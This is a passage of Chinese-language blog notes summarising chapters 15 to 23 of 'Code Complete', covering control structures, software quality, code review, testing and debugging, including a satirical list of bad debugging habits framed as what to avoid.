语句时排序的窍门"></a>使用 case 语句时排序的窍门</h3><ul><li><strong>按照字母顺序或者数字顺序排列各种情况</strong>。如果所有情况的重要性都相同，那么就把他们按字母顺序排列，以便提高可读性。</li><li><strong>把正常的情况放在前面</strong>。如果有一个正常的情况和多个异常情况，那么就把那个正常的情况放在最前面。用注释来说明它是正常情况，而其他的属于非正常情况。</li><li><strong>按执行频率排列case子句</strong>。把最经常执行的情况放在最前面，最不常执行的放在最后。</li></ul><h3 id="使用-case-语句的诀窍"><a href="#使用-case-语句的诀窍" class="headerlink" title="使用 case 语句的诀窍"></a>使用 case 语句的诀窍</h3><ul><li>简化每种情况对应的操作。如果某种情况的操作非常复杂，就写一个子程序，并在该情况对应的 case 字句中调用它，而不要把代码本身放进这一 case 子句中。</li><li>不要为了使用 case 语句而刻意制造一个变量。case语句应该用于处理简单的、容易分类的数据。如果你的数据并不简单，那么就使用 if-then-else 语句串。为使用case而刻意构造出的变量很容易把人搞糊涂，你应该避免使用这种变量。.</li><li><strong>把 default 用于检查真正的默认情况，而不要用于最后需要处理的情况</strong>，这会让人很迷惑并难以维护。</li><li>利用 default 检查错误</li></ul><h2 id="第16章-控制循环"><a href="#第16章-控制循环" class="headerlink" title="第16章 控制循环"></a>第16章 控制循环</h2><p>在代码进入循环时使用下述指导原则：</p><ul><li>只从一个位置进入循环</li><li>把初始化代码紧放在循环前面</li><li>用 <code>while(true)</code>表示无限循环，而非<code>for i = 1 to 999999</code></li><li>在适当的情况下多使用for循环。for 循环将控制代码都集中在一处，从而有助于写出可读性强的循环。修改 while 循环时，常常容易只修改了头部的初始化代码，而忘记修改退出代码，而 for 循环的初始化与退出则都在一起</li><li>在 while 更适用时，不要使用 for 循环</li></ul><p>高效程序员与低效程序员的差别在于：高效程序员会在脑海中模拟程序的执行，并会手动计算来减少差错。而低效程序员则在不停的试验，寻找一种看上去能工作的组合，这样做最终可能会碰出正确的组合来，也可能把原有的错误改成了另一个更微妙的错误。即使这样随意的开发过程能够产生出一个正确的程序，这些程序员也不明白为什么这个程序是正确的。<strong>你需要真正理解你的代码是如何工作的，而不是瞎猜。</strong></p><p>循环下标尽量使其具有可读性，避免使用<code>i</code>、<code>j</code>、<code>k</code>，以及在嵌套循环中重复使用相同的下标名。</p><h3 id="循环应该有多长？"><a href="#循环应该有多长？" class="headerlink" title="循环应该有多长？"></a>循环应该有多长？</h3><ul><li>循环要尽可能的短，以便能够一目了然</li><li>把嵌套限制在 3 层以内</li><li>把长循环的内容移到子程序里</li><li>要让长循环格外清晰</li></ul><h2 id="第17章-不常见的控制结构"><a href="#第17章-不常见的控制结构" class="headerlink" title="第17章 不常见的控制结构"></a>第17章 不常见的控制结构</h2><p>使用递归的技巧：</p><ul><li>确认递归能够停止</li><li>使用安全计数器放置出现无穷递归</li><li>把递归限制在一个子程序内</li><li>留心栈空间</li><li>不要用递归去计算阶乘或者斐波那契数列（<a href="https://blog.csdn.net/code_see/article/details/6327472" target="_blank" rel="noopener">为什么用 递归 计算“阶乘”和“斐波那契数列”是不合适的？</a>）</li></ul><h2 id="第18章-表驱动法"><a href="#第18章-表驱动法" class="headerlink" title="第18章 表驱动法"></a>第18章 表驱动法</h2><p>（略）</p><h2 id="第19章-一般控制问题"><a href="#第19章-一般控制问题" class="headerlink" title="第19章 一般控制问题"></a>第19章 一般控制问题</h2><p>如何简化复杂的表达式？</p><ul><li>编写肯定的布尔表达式，尽可能减少诸如<code>if(!status)</code>这样的否定判断</li><li>用括号使布尔表达式更清晰</li></ul><p>编程中，0 是一个数值，是空指针的取值，是枚举的第一个元素的取值，是逻辑表达式中的 false，既然它有这么多的用途，因此在代码中应该彰显 0 的明确含义。</p><h3 id="与-0-比较的指导原则"><a href="#与-0-比较的指导原则" class="headerlink" title="与 0 比较的指导原则"></a>与 0 比较的指导原则</h3><ul><li>隐式地比较逻辑变量</li><li>把数字和 0 比较时，应写作 <code>if(balance != 0)</code>而非<code>if(!balance)</code></li><li>在 C 中显示地比较字符和零终止符（<code>&#39;\0&#39;</code>）</li><li>指针与 NULL 比较</li></ul><p><em>在进行条件判断时，我们常常可能因少写了一个<code>=</code>而将<code>==</code>写作赋值，因此我们可以把常量写在表达式的左侧，这样，当我们少写了一个<code>=</code>时，编译器就会及时捕获到错误。</em></p><h3 id="避免深层嵌套"><a href="#避免深层嵌套" class="headerlink" title="避免深层嵌套"></a>避免深层嵌套</h3><ul><li>将深层嵌套的判断条件合并</li><li>将判断条件转换为 if-else 结构</li><li>使用 case 语句判断</li><li>将复杂的深层嵌套代码抽取为单独的子程序</li><li>使用对象和多态</li><li>用状态变量重写代码</li><li>重新设计深层嵌套代码</li></ul><p><strong>复杂的代码表明你还没有充分理解你的程序</strong>，所以无法简化它。深层嵌套是一个警告，它说明你要么应该拆分出一个子程序，要么应该重新设计那部分复杂的代码。</p><p><strong>结构化编程的核心思想是指，一个应用程序应该只采用一些单入单出的控制结构</strong>。单入单出的控制结构是指一个代码块，它只能从一个位置开始执行，并且只能结束于一个位置，除此之外再无其他入口或出口。一个结构化的程序将按照一种有序的且有规则的方式执行，不会做不可预知的随便跳转。结构化编程和结构化的、自上而下的设计不完全一样，前者只适用于具体编码层。</p><p>程序复杂度的一个衡量标准是，为了理解应用程序，你必须在同一时间记住的实体的数量。有能力的程序员会充分地认识到自己的大脑容量是多么有限，所以他们会非常谦卑地处理编程任务。</p><h3 id="控制结构的相关事宜"><a href="#控制结构的相关事宜" class="headerlink" title="控制结构的相关事宜"></a>控制结构的相关事宜</h3><ul><li>表达式中用的是true和false，而不是1和0吗?</li><li>布尔值和true以及false做比较是隐式进行的吗?</li><li>对数值做比较是显式进行的吗?</li><li>有没有通过增加新的布尔变量、使用布尔函数和决策表来简化表达式?</li><li>布尔表达式是用肯定形式表达的吗?</li><li>括号配对吗?</li><li>在需要用括号来明确的地方都使用了括号吗?</li><li>把逻辑表达式全括起来了吗?</li><li>判断是按照数轴顺序编写的吗?</li><li>如果适当的话，Java 中的判断用的是<code>a.equals(b)</code>方式， 而没有用<code>a==b</code>方式吗?</li><li>空语句表述得明显吗?</li><li>用重新判断部分条件、转换成if-then-else 或者case 语句、把嵌套代码提取成单独的子程序、换用一种更面向对象的设计或者其他的改进方法来简化嵌套语句了吗?</li><li>如果一个子程序的决策点超过10个，那么能提出不重新设计的理由吗?</li></ul><h2 id="第20章-软件质量概述"><a href="#第20章-软件质量概述" class="headerlink" title="第20章 软件质量概述"></a>第20章 软件质量概述</h2><h3 id="软件质量特性"><a href="#软件质量特性" class="headerlink" title="软件质量特性"></a>软件质量特性</h3><ul><li><p>外在特性</p><ul><li><strong>正确性(Correctness)</strong>。指系统规范、设计和实现方面的错误的稀少程度。</li><li><strong>可用性(Usability)</strong>，指用户学习和使用一个系统的容易程度。</li><li><strong>效率 (Efficiency)</strong>。指软件是否尽可能少地占用系统资源，包括内存和执行时间。</li><li><strong>可靠性(Reliability)</strong>。指在指定的必需条件下，一个系统完成所需要功能的能力——应该有很长的平均无故障时间。</li><li><strong>完整性(Integrity)</strong>。指系统阻止对程序或者数据进行未经验证或者不正确访问的能力。这里的完整性除了包括限制未经授权用户的访问外，还包括确保数据能够正确访问。</li><li><strong>适应性(Adaptability)</strong>。指为特定的应用或者环境设计的系统，在不做修改的情况下，能够在其他应用或者环境中使用的范围。</li><li><strong>精确性(Accuracy)</strong>。指对于一个已经开发出的系统，输出结果的误差程度,尤其在输出的是数量值的时候。精确性和正确性的不同在于，前者是用来判断系统完成工作的优劣程度，而后者则是判断系统是否被正确开发出来。</li><li><strong>健壮性( Robustness)</strong>。这指的是系统在接收无效输入或者处于压力环境时继续正常运行的能力。</li></ul></li><li><p>内在特性</p><ul><li><strong>可维护性(Maintainability)</strong>。指是否能够很容易对系统进行修改，改变或者增加功能，提高性能，以及修正缺陷。</li><li><strong>灵活性(Flexibility)</strong>。指假如一个系统是为特定用途或者环境而设计的,那么当该系统被用于其他目的或者环境的时候，需要对系统做修改的程度。</li><li><strong>可移植性(Portability)</strong>。指为了在原来设计的特定环境之外运行，对系统所进行修改的难易程度。</li><li><strong>可重用性(Reusability)</strong>。指系统的某些部分可被应用到其他系统中的程度,以及此项工作的难易程度。</li><li><strong>可读性(Readability)</strong>。指阅读并理解系统代码的难易程度，尤其是在细节语句的层次上。</li><li><strong>可测试性(Testabiity)</strong>。指的是你可以进行何种程度的单元测试或者系统测试，以及在何种程度上验证系统是否符合需求。</li><li><strong>可理解性(Understandability)</strong>。指 在系统组织和细节语句的层次上理解整个系统的难易程度。与可读性相比，可理解性对系统提出了更高的内在一致性要求。</li></ul></li></ul><p>外在特性与内在特性并不完全割裂，在某些层次上内在特性会影响外在特性。</p><p>要让所有特性都能表现得尽善尽美是绝无可能的。需要根据一组互相竞争的目标寻找出一套优化的解决方案，正是这种情况使软件开发成为一个真正的工程学科。</p><h3 id="改善软件质量的方法"><a href="#改善软件质量的方法" class="headerlink" title="改善软件质量的方法"></a>改善软件质量的方法</h3><ul><li>设定质量目标。根据上一节所提到的软件质量特性，明确定义出软件质量的目标，并要求开发者朝着目标努力。</li><li>明确定义质量保证工作</li><li>测试策略</li><li>软件工程指南</li><li>非正式技术复查</li><li>正式技术复查</li><li>外部审查</li></ul><h3 id="开发过程"><a href="#开发过程" class="headerlink" title="开发过程"></a>开发过程</h3><ul><li><strong>对变更进行控制的过程</strong>。实现软件质量目标的拦路虎之一就是失控的变更。需求变更的失控可能使设计和编码工作前功尽弃；设计变更的失控则会造成代码与需求背离，或代码自相矛盾，或是程序员为达到变更后的设计要求，不得不耗费比推进项目更多的时间来修改代码。代码变更的失控则可能造成内部冲突，程序员无法确定哪些代码已经过完全复查和测试，而哪些没有。变来变去的自然影响就是质量不稳定和恶化，因此，<strong>有效地管理变更是实现高质量的一个关键</strong>。</li><li><strong>结果的量化</strong>。除非质量保证计划的结果经过实际测量，否则你将完全不知道这个计划是否有实效。量化结果能告诉你计划成功与否，并且允许你用可控的方式来调整你的计划，去看你能如何改善它。你也可以度量各种质量特性本身——正确性、可用性以及效率等，这么做是很有用的。</li><li><strong>制作原型(Prototyping)制作</strong>。原型是指开发出系统中关键功能的实际模型。对一个开发者来说，开发出一部分用户界面的原型可以判断系统的可用性，开发出关键算法的原型可以确定功能的执行时间，开发出典型数据集的原型能知道程序的内存需求。构建原型能产生更完善的设计，更贴近用户的需求，以及更好的可维护性。</li></ul><h3 id="不同质量保障技术的相对效能"><a href="#不同质量保障技术的相对效能" class="headerlink" title="不同质量保障技术的相对效能"></a>不同质量保障技术的相对效能</h3><p>通过结合多种bug 检测方式来有效降低 bug 率，如代码 review、单元测试、集成测试、回归测试等。</p><p><strong>检查代码发现 bug 比测试出 bug 的成本更小</strong>，因此，当开发完新功能时，需要先通读本次的开发代码，然后自己进行流程测试。</p><p>似乎修正相同 bug 的成本是相同的，但事实并非如此。因为<strong>一个bug 存在的时间越长，消除它的代价也就越大</strong>，因此能够尽早发现错误的检测方法可以降低修正 bug 的成本。</p><p>在一个由超过400名程序员创建的 70 万行代码程序中，代码复查的成本效益比测试高出好几倍——前者的回报率为 1.38，后者仅为 0.17。</p><p>一个有效的软件质量项目的底线，必须包括在开发的所有阶段联合使用多种技术，下面是一套推荐阵容，通过它们可以获取高于平均水平的质量：</p><ul><li>对所有的需求、架构以及系统关键部分的设计进行正式检查</li><li>建模或者创建原型</li><li>代码阅读或者检查</li><li>执行测试</li></ul><p><strong>质量保障工作应该贯穿于整个项目周期中，尤其是调研与架构设计阶段，在项目初期引入缺陷，这个缺陷会像核辐射一样污染整个项目。</strong></p><p><strong>软件产品的业界平均生产效率大约是每人每天 10~50 行最终交付代码，那么每天剩下的时间是怎么度过的呢？</strong>绝大多数项目最大规模的一种活动就是调试以及修正那些无法正常工作的代码。调试和与此相关的重构或者其他返工工作，在传统的不成熟的软件开发周期当中可能消耗大约50%的时间。只要避免引入错误，就可以减少试时间，从而提高生产力。因此，<strong>效果最明显的缩短开发周期的办法就是改善产品的质量，由此减少花费在调试和软件返工上面的时间总量</strong>。更多质量保证工作能降低 bug 率，但不会增加开发的总成本。IBM的一个研究也得到了类似的结论：<strong>缺陷最少的软件项目的开发计划时间最短，并拥有最高的开发生产率….消除软件缺陷实际上是最昂贵且最耗时的一种软件工作</strong>(Jones2000)。</p><blockquote><p>所有的“功能先上线，优化后期做”都是伪命题。随着项目的发展，越来越多的 bug 引入项目中，导致后期的开发不断被反馈的 bug 打断，无法专注开发，从而造成正在开发功能的 bug，形成恶性循环……</p></blockquote><h3 id="Key-Points"><a href="#Key-Points" class="headerlink" title="Key Points"></a>Key Points</h3><ul><li>开发高质量代码最终并没有要求你付出更多，只是你需要对资源进行重新分配，以低廉的成本来防止缺陷出现，从而避免代价高昂的修正工作。</li><li><strong>并非所有的质量保证目标都可以全部实现。明确哪些目标是你希望达到的</strong>，并就这些目标和团队成员进行沟通。</li><li>没有任何一种错误检测方法能够解决全部问题，测试本身并不是排除错误的最有效方法。成功的质量保证计划应该使用多种不同的技术来检查各种不同类型的错误。</li><li>在构建期间应当使用一些有效的质量保证技术，但在这之前，一些具有同样强大功能的质量保证技术也是必不可少的。<strong>错误发现越早，它与其余代码的纠缠就越少，由此造成的损失也越小</strong>。</li><li>软件领域的质量保证是面向过程的。软件开发与制造业不一样，在这里并不存在会影响最终产品的重复的阶段，因此，最终产品的质量受到开发软件所用的过程的控制。</li></ul><h2 id="第21章-协同构建"><a href="#第21章-协同构建" class="headerlink" title="第21章 协同构建"></a>第21章 协同构建</h2><p>“协同构建”包括结对编程、正式检查、非正式技术复查、文档阅读，以及让其他开发人员共同承担创建代码及其他工作产品责任的技术。</p><p>协同构建的首要目的就是改善软件的质量。另一个好处是，它可以缩短开发周期，从而减低开发成本。</p><h3 id="代码-review-的一些研究案例及收益"><a href="#代码-review-的一些研究案例及收益" class="headerlink" title="代码 review 的一些研究案例及收益"></a>代码 review 的一些研究案例及收益</h3><ul><li>IBM发现，一小时的代码检查能够节省大约100小时的相关工作(测试和缺陷修正)(Holland 1999)。</li><li>对一些大型程序的一项研究发现，在正式检查上面花一个小时，平均可以避免33个小时的维护工作,并且检查的效能是测试的20倍以上(Russell1991)。</li><li>同一组人员开发了11个程序，并将它们发布到产品当中。其中的前5个没有进行复查，其平均每百行代码存在4.5个错误。另外6个经过了代码检查，平均每百行代码只有0.82 个错误。复查消灭了超过80% 的错误(Freedman and Weinberg 1990)。</li></ul><h3 id="协同构建有利于传授公司文化以及编程专业知识"><a href="#协同构建有利于传授公司文化以及编程专业知识" class="headerlink" title="协同构建有利于传授公司文化以及编程专业知识"></a>协同构建有利于传授公司文化以及编程专业知识</h3><p>软件标准可以写下来并发布出去，但是如果无人去讨论它们，也不鼓励使用这些标准，那么就不会有人去按照这些标准做事情。<strong>复查是一个很重要的机制，它可以让程序员得到关于他们自己代码的反馈。代码、标准以及让代码符合标准的理由等，都是复查讨论中的好主题。</strong></p><p>程序员除了需要得到他们是否很好地遵循了标准的反馈之外，还需要得到程序设计主观方面的回馈，例如格式、注释、变量名、局部变量和全局变量的使用、设计方法以及“我们这里采用的解决方法(the- way-we-do-things-around-here)”等。刚出道的编程人员需要那些有更丰富知识的前辈给予指导，而资深程序员们往往太忙而没时间同他人分享他们的知识。复查为这两种人提供了一个技术交流的平台，所以，无论在未来还是现在，<strong>复查都是培养新人以提高其代码质量的好机会</strong>。</p><p>一个采用正式检查的团队报告称，<strong>复查可以快速地将所有开发者的水平提升到最优秀的开发者的高度</strong>(Tackett and Van Doren 1999)。</p><h3 id="集体所有权适用于所有形式的协同构建"><a href="#集体所有权适用于所有形式的协同构建" class="headerlink" title="集体所有权适用于所有形式的协同构建"></a>集体所有权适用于所有形式的协同构建</h3><p>在集体所有权下，所有的代码都属于团队而不是某一个人，并且团队中的所有成员都可以对其进行访问和修改。这会带来一些很有价值的好处。</p><ul><li>众多双眼睛的检查，以及众多程序员的协力编写，可以使代码的质量变得更好。</li><li>某个人离开项目所造成的影响更小了，因为每段代码都有多个人熟悉它。</li><li>总体上缺陷修正周期变短了，因为几个程序员中的任何一个有空，就能随时被指派去修正缺陷。</li></ul><blockquote><p>协同构建的思想同样适用于评估、计划、需求、架构、测试以及维护工作等阶段。</p></blockquote><h3 id="结对编程的好处"><a href="#结对编程的好处" class="headerlink" title="结对编程的好处"></a>结对编程的好处</h3><ul><li>与单独开发相比，结对能够使人们在压力之下保持更好的状态。结对编程鼓励双方保持代码的高质量，即使在出现了让人不得不飞快地编写代码的压力时仍然如此。</li><li>它能够改善代码质量。代码的可读性和可理解性都倾向于上升至团队中最优秀程序员的水平。</li><li>它能缩短进度时间表。结对往往能够更快地编写代码，代码的错误也更少。这样一来，项目组在项目后期花费在修正缺陷的时间会更少。</li><li>它还具有协同构建的其他常见好处，包括传播公司文化，指导初级程序员，以及培养集体归属感。</li></ul><p><strong>任何处于开发阶段的代码评审均不应作为员工的表现评审，而应该是基于最终的产品。如果对员工表现进行排名，则应该警告那些处于最低标准以下的员工，而非末位员工。</strong></p><h3 id="正式检查"><a href="#正式检查" class="headerlink" title="正式检查"></a>正式检查</h3><p>进行详查的目的是发现设计或者代码中的缺陷，而不是探索替代方案，或者争论谁对谁错，其目的绝不应该是批评作者的设计或者代码。对于作者来说，详查的过程应该是正面的，在这一过程中的团队参与使程序得到了明显改善，对所有参与者都是一个学习的过程。这一过程不应该让作者认为团队里面某些人是白痴,或者认为自己应该另谋高就。</p><p>有效的详查：</p><ul><li>你是否有一个核对表，能让评论员将注意力集中于曾经发生过问题的领域?</li><li>你是否专注于找出错误，而不是修正它们?</li><li>你是否考虑制定某些视角或者场景，以帮助评论员在准备工作的时候集中注意力?</li><li>你是否给予评论员足够的时间在详查会议之前进行准备，是否每一个人都做了准备?</li><li>是否每一个参与者都扮演一个明确的角色——主持人、评论员及记录员等?</li><li>会议是否以某种高效的速度进行?</li><li>会议是否限制在两个小时以内?</li><li>是否所有详查会议的参与者都接受了如何进行详查的针对性培训，是否主持人接受了有关主持技巧方面的针对性培训?</li><li>是否将每次详查所发现的错误数据都收集起来，使你能调整本组织以后使用的核对表?</li><li>是否收集了准备速度和详查速度方面的数据，以便你去优化以后的准备和详查工作?</li><li>是否每次详查中被指派下去的活动都被正确跟进了，无论是通过主持人自己还是一次重新详查?</li><li>管理层是否理解他们不应该参与详查会议?</li><li>是否有一个用于保证修正正确性的跟进计划?</li></ul><p>NASA 的一项研究表明，通过阅读代码，每小时能发现 3.3 个 bug，而测试只能发现 1.8 个，在整个项目点生命周期中，代码 review 能比各种测试方法多发现20%~60%的错误。</p><p>代码 review 相比于会议形式的代码评审而言，能让评审者更专注于代码的独立复查，而非会议本身。<strong>在会议中，每个人只在一部分时间做贡献。</strong></p><h2 id="第22章-开发者测试"><a href="#第22章-开发者测试" class="headerlink" title="第22章 开发者测试"></a>第22章 开发者测试</h2><h3 id="测试包括"><a href="#测试包括" class="headerlink" title="测试包括"></a>测试包括</h3><ul><li>单元测试</li><li>组件测试</li><li>集成测试</li><li>回归测试</li><li>系统测试</li></ul><p>很多项目将测试作为软件质量的唯一组成部分，这是非常错误的做法，因为各种形式的协同开发时间都表现出比测试更高的错误检测率，而且发现一条错误的成本不到测试的二分之一。</p><p>你必须期望在你的代码里有错误。尽管这种期望似乎有悖常理，但是你应该期望找到这个错误的人是你，而不是别人。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g872vsqju0j31080j040x.jpg" alt=""></p><blockquote><p>如何开发出高质量的程序？</p></blockquote><ol><li>对开发的功能搭建原型框架，判断是否存在缺陷</li><li>采用单元测试</li><li><strong>开发完成自我 review 代码</strong>，这通常能发现很多问题，避免这些问题在测试中浪费时间。</li><li>对开发的功能测试</li><li>寻求更有经验的人 review</li><li>提交测试</li></ol><p>假如你正在写几个子程序，那么你应该一个一个地对它们进行测试。独立进行子程序的测试不是一件容易的事情，但是单独调试它们，比集成之后再进行测试要简单得多。如果将几个没有经过测试的子程序放到一起，结果发现了一个错误，那么这几个子程序都有嫌疑。假如每次只将一个子程序加入到此前经过测试的子程序集合中，那么一旦发现了新的错误，你就会知道这是新子程序或者其接口所引发的问题，调试工作就轻松多了。</p><p>完全测试（测试程序每一种可能的输入值）是不可能，也没必要的。我们可以选择那些最有可能找到错误的测试用例。</p><p>几种较好的测试数据类型：</p><ul><li>正常情况下的数据</li><li>正常情况的最小值</li><li>正常情况的最大值</li><li>与旧数据的兼容性</li></ul><p>绝大多数错误往往与少数几个具有严重缺陷的子程序有关。<strong>80%的错误存在于20%的类或子程序当中。</strong></p><p><strong>错误并非平均分布在所有的子程序里，而是集中在少数几个子程序中。</strong></p><p>软件质量的普遍原则：<strong>提高质量就能缩短开发周期，同时降低开发成本。</strong></p><h3 id="错误的分类启示"><a href="#错误的分类启示" class="headerlink" title="错误的分类启示"></a>错误的分类启示</h3><ul><li>大多数错误的影响范围是相当有限的</li><li>许多错误发生在构建之外。如：缺乏应用领域知识、频繁变动且相互矛盾的需求，以及沟通和协调的失败。</li><li>大多数的构建期错误是有开发者造成的</li><li>拼写错误是一个常见的问题根源</li><li>开发者错误理解设计经常发生</li><li>大多数错误都很容易修正。大约85%的错误可以在几小时内修正，15%的错误在几小时到几天内可以修正，只有大约1%的错误需要花更长的时间修复。</li><li>总结所在组织中对付错误的经验</li></ul><h3 id="测试记录应该包括"><a href="#测试记录应该包括" class="headerlink" title="测试记录应该包括"></a>测试记录应该包括</h3><ul><li>缺陷的管理方面描述(报告日期、报告人、描述或标题、生成编号以及修正错误的日期等)</li><li>问题的完整描述</li><li>复现错误所需要的步骤</li><li>绕过该问题的建议</li><li>相关的缺陷</li><li>问题的严重程度——例如致命的、严重的或者表面的</li><li>缺陷根源:需求、设计、编码还是测试</li><li>对编码缺陷的分类: off-by-one 错误、错误赋值、错误数组下标，以及子程序调用错误等</li><li>修正错误所改变的类和子程序</li><li>缺陷所影响的代码行数</li><li>查找该错误所花的小时数</li><li>修正错误所花费的小时数</li></ul><p>通过测试记录可以</p><ul><li>对每一个类中的缺陷数目统计，从最糟糕的类到最好的类依次列出，如果类的规模不同，可能需要对这一数字进行归一化处理</li><li>按照同样的方式列出每个子程序中的缺陷数，也可能需要根据子程序大小归一化处理</li><li>发现一个错误平均所需要花费的测试时间</li><li>每个测试用例所发现缺陷的平均数</li><li>修正一个缺陷花费的平均编程时间</li><li>全部测试用例的代码覆盖率</li><li>在各个严重级别中未处理缺陷的数量</li></ul><p><strong>测试数据本身出错的密度往往比被测代码还要高</strong>。查找这种错误完全是浪费时间，又不能对代码有所改善，因此测试数据里面的错误更加让人烦恼。要像写代码一样小心地开发测试用例，这样才能避免产生这种问题。</p><h2 id="第23章-调试"><a href="#第23章-调试" class="headerlink" title="第23章 调试"></a>第23章 调试</h2><p><strong>请不要通过反复尝试编程！！！</strong></p><h3 id="你可以从-bug-中获得以下好处"><a href="#你可以从-bug-中获得以下好处" class="headerlink" title="你可以从 bug 中获得以下好处"></a>你可以从 bug 中获得以下好处</h3><ul><li><strong>理解你正在编写的程序</strong>。如果你确实已经透彻地理解了它，这个程序就不应该还有bug。</li><li><strong>明确你犯了哪种类型的错误</strong>。一旦你发现了错误，请问问自己为什么会犯这样的错误。你如何才能更快地发现这个错误？你如何才能预防此类错误的发生？代码里面还有类似的错误么？你能在这些错误造成麻烦之前改正它们么？</li><li><strong>从代码阅读者的角度分析代码质量</strong>。代码易读么？它怎样才能更好？用你的结论重构你现在的代码，并让自己下次编写的代码更好。</li><li><strong>审视自己解决问题的方法</strong>。你自己解决调试问题时用到的方法使你感到自信吗？你的方法管用么？你能够很快地发现缺陷么？或者正是你的方法导致调试工作成效很差？调试过程中你有痛苦和挫败感么？你是在胡乱猜测么？你的调试方法需要改进么？花点时间来分析并改进你的调试方法，可能就是减少程序开发时间的最有效方法。</li><li><strong>审视自己修正缺陷的方法</strong>。解决方法是否治标不治本呢？是否应该从系统角度进行修正，通过精确的分析对问题的根本原因对症下药呢？</li></ul><p>调试其实是一片极其富饶的土地，它孕育着你进步的种子。这片土地也是所有软件构建之路所交织的地方：可靠性、设计、软件质量，凡是你能想到的无所不包。这几乎等同于编写优秀代码所得到的回报。如果你能精于此道，你甚至无须频繁调试。</p><h3 id="调试之魔魂指南"><a href="#调试之魔魂指南" class="headerlink" title="调试之魔魂指南"></a>调试之魔魂指南</h3><ul><li><strong>凭猜测找出缺陷</strong>。要找出缺陷，请把print语句随机地散布在程序中。检查这些语句的输出来确定缺陷到底在哪里。如果通过print语句还是不能找到缺陷，那么就在程序中修改点什么，直到有些东西好像能干活了。不要备份程序的原始版本，也不要记录你做了哪些改变。只有在你无法确定自己的程序正在干什么的时候，编程才比较刺激。请提早准备一些可乐和糖果，因为你会在显示器前度过一个漫漫长夜。</li><li><strong>不要把时间浪费在理解问题上</strong>。出现的问题不值一提，要解决它们并不需要彻底弄懂程序。只要找出问题就行了。</li><li><strong>用最唾手可得的方式修正错误</strong>。与其把时间浪费在一个庞大、雄心万丈的，甚至可能影响整个程序的修正工作上，还不如直接去解决你所面对的那个特殊问题。下面是一个完美的例子，如果在这里写一段特例处理代码就可以解决问题，谁会去对<code>Compute()</code>寻根究底，弄清与值17有关的棘手问题究竟是什么。<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">x</span> = Compute(<span class="symbol">y</span>)</span><br><span class="line"><span class="keywords">if</span> (<span class="symbol">y</span> = <span class="number">17</span>) </span><br><span class="line"><span class="symbol">x</span> = $<span class="number">25.15</span> <span class="comment">// 当 y=17 时，Compute()没有起作用，因此需要修改</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="迷信式编程"><a href="#迷信式编程" class="headerlink" title="迷信式编程"></a>迷信式编程</h3><p><em>毎个团队里都也许有这样一个程序员，他总会遇到无穷的问题：不听话的机器，奇怪的编译器错误，月圆时オ会出现的编程语言的隐藏缺陷，失效的数据，忘记做的重要改劫，一个不能正常保存程序的疯狂的编辑器。</em></p><p>要知道，<strong>如果你写的程序出了问题，那就是你的原因</strong>，不是计算机的，也不是编译器的。程序不会每次都产生不同的结果。它不是自己写出来的，是你写的，所以，请对它负责。即使某个错误初看似乎不能归咎于你，但出于你自身的利益，最好还是假设它是由你产生的。这样的假设将有助于你的调试。同时避免你先指责别人犯了错，最终却发现错误其实由你而生的尴尬场景。</p><p><strong>在大多数情况下，查找 bug 并理解 bug 通常占用了整个调试工作的 90%。</strong></p><h3 id="科学的调试方法"><a href="#科学的调试方法" class="headerlink" title="科学的调试方法"></a>科学的调试方法</h3><ol><li>确保 bug 可以稳定复现</li><li>确定 bug 位置</li><li>1 收集产生 bug 的相关数据</li><li>2 分析所收集的数据，并作出 bug 产生的假设</li><li>3 确定如何证实或证伪该假设，可以对程序测试或检查代码</li><li>4 通过 2.3 方法对假设作出最终结论</li><li>修复 bug</li><li>对修复结果测试</li><li>查找是否存在类似错误</li></ol><h3 id="查找-bug-的一些建议"><a href="#查找-bug-的一些建议" class="headerlink" title="查找 bug 的一些建议"></a>查找 bug 的一些建议</h3><ul><li>如果一个错误无法重现，这通常是一个初始化错误，或者是一个同时间有关的问题，或者是悬空指针问题。</li><li>如果出现了一个难于确诊的新错误，这个错误通常是同那些最新修改的代码相关。</li><li>增量式集成。当你每次只对系统添加一个代码片段，调试将变得很容易。如果在这一过程中出现错误，则应将所添加的代码提取出来单独测试。</li><li><strong>将所有可能的情况罗列出来，并逐一验证，避免在某一种困境中呆的太久。</strong></li><li>缩小代码嫌疑。通过打印输出、日志、请求链跟踪等方式进一步精确问题可能发生的位置。</li><li>扩大嫌疑代码。如果在某个代码范围内没能找到问题，请考虑问题是否的确不在该代码段内。</li><li><strong>对之前出现过问题的类与子程序保持警惕，它们很可能再次“作案”。</strong></li><li>同其他人讨论。<strong>当你向别人解释自己的程序时，常常能发现自己犯下的错误。</strong></li><li>抛开问题，休息一下。<strong>如果你调试了很久却毫无进展，只要你尝试完所有的可能，把问题放在一边吧！</strong>出去散散步，做一些其他的事情。回家休息一天，让你的神经在潜意识中释放出问题的解决方案。</li></ul><h3 id="修复-bug"><a href="#修复-bug" class="headerlink" title="修复 bug"></a>修复 bug</h3><p>一项调查显示，<strong>第一次对 bug 的修复有 50% 的几率出错</strong>。以下是一些减少出错的建议：</p><ul><li>在动手前先理解问题</li><li>理解程序本身，而不仅仅是问题。对项目的了解越多，越不容易出错；过于庞大的项目至少要了解 bug 的上下文。</li><li>验证对错误的分析。确定你找到的真正的 bug</li><li><strong>越是紧急情况下越容易出现问题</strong>。如赶火车前突然发现的问题，一个非常小的紧急 bug 不经测试便发布。经验告诉我们，越是慌乱，越容易出问题，如果你无法泰然处之，请与同事一起处理。</li><li>休息一下。如果你无法确定是否彻底解决了问题，并且时间允许，请放松一下，正确解决问题远比匆忙错误解决问题重要。</li><li>保存最初的源代码。如果你的修改没有奏效，或者引发了新的问题，请比对一下修改是否正确。</li><li>治本，而不是治标。如果没有彻底理解问题，就不要去修改代码。如果仅仅治标，你只会把代码搞得更糟糕。</li><li>一次只做一个改动</li><li>检查自己的改动</li><li>增加能暴露问题的单元测试</li><li>搜索类似的缺陷。如果你想不出如何查找类似缺陷，这就意味着你还没有完全理解问题。</li></ul><p>不要让你的代码被特例所纠缠。</p><h2 id="第24章-重构"><a href="#第24章-重构" class="headerlink" title="第24章 重构"></a>第24章 重构</h2><p>软件演化就像生物进化一样，有些突变是对物种有益的，另一些则是有害的。良性的软件演化使代码得到了发展。</p><p>软件演化的基本准则：演化应当提升程序的内在质量。</p><h3 id="重构的理由"><a href="#重构的理由" class="headerlink" 